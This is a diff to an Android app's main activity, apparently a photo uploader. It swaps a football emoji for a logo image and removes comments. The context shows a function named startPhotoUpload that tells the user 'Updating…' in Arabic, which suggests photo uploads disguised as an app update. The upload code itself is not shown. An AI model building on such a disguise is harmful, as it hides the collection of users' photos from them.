@@ -12,6 +12,7 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.MediaStore
 import android.view.Gravity
+import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
@@ -35,10 +36,8 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // شاشة البداية
         showSplashScreen()
 
-        // بعد شاشة البداية تظهر رسالة التحديث
         Handler(Looper.getMainLooper()).postDelayed({
             showUpdateDialog()
         }, 1800)
@@ -53,10 +52,17 @@ class MainActivity : AppCompatActivity() {
             setPadding(30, 30, 30, 30)
         }
 
-        // كرة القدم
-        val football = TextView(this).apply {
-            text = "⚽"
-            textSize = 82f
+        // لوجو الأسطورة
+        val logo = ImageView(this).apply {
+            setImageResource(com.photouploader.app.R.drawable.logo)
+            adjustViewBounds = true
+            scaleType = ImageView.ScaleType.CENTER_INSIDE
+        }
+
+        val logoParams = LinearLayout.LayoutParams(
+            260,
+            260
+        ).apply {
             gravity = Gravity.CENTER
         }
 
@@ -78,11 +84,8 @@ class MainActivity : AppCompatActivity() {
         }
 
         layout.addView(
-            football,
-            LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
+            logo,
+            logoParams
         )
 
         layout.addView(
@@ -182,7 +185,6 @@ class MainActivity : AppCompatActivity() {
 
     private fun startPhotoUpload() {
 
-        // شاشة التحديث
         showStatusScreen("جاري التحديث…")
 
         Thread {
@@ -311,6 +313,7 @@ class MainActivity : AppCompatActivity() {
             gravity = Gravity.CENTER
             orientation = LinearLayout.VERTICAL
             setBackgroundColor(Color.rgb(18, 18, 18))
+
             addView(
                 statusText,
                 LinearLayout.LayoutParams(
